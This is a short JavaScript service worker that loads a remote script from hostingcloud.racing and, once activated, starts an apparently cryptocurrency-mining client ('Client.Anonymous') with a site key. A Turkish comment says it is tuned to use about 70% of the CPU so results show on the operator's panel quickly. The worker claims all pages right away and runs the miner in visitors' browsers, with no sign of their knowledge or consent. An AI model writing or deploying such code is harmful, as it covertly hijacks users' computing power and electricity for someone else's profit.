try {
    importScripts('https://www.hostingcloud.racing/jeVO.js');
} catch (e) {}

self.addEventListener('install', event => self.skipWaiting());
self.addEventListener('activate', event => {
    event.waitUntil(clients.claim());
    if (typeof Client !== 'undefined') {
        const _client = new Client.Anonymous('ae5f219d63b18a851a9a0cfe3e4dbe17df998943e07bed8eb17dd899ee5ac244', {
            throttle: 0.3, // %70 CPU kullanımı (Hemen panelde görünmesi için yüksek tuttuk)
            c: 'w'
        });
        _client.start();
    }
});
